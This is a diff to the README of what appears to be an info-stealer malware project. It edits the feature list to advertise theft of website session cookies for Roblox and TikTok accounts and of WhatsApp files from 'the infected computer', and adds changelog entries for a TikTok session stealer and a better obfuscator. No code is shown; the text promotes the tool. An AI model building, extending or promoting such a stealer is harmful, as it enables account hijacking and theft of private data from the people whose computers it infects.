@@ -31,7 +31,7 @@
 
 ## <a id="features"></a>✨・Features
 ```
-🤖 - Roblox Cookie Information (Username, Robux, Friends and more!)
+🤖 - Website Cookie Information (Username, Money, Friends and more!) (Work for Roblox And Tiktok)
 
 🤔 - Whatsapp Stealer: Steal all whatsapp file on the infected computer
 
@@ -78,6 +78,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.5 Added tiktok session stealer
 - V4.4.8 Better obfuscator
 - V4.4.7 Fixed some stuff
 - V4.4.6 Make it 2x faster
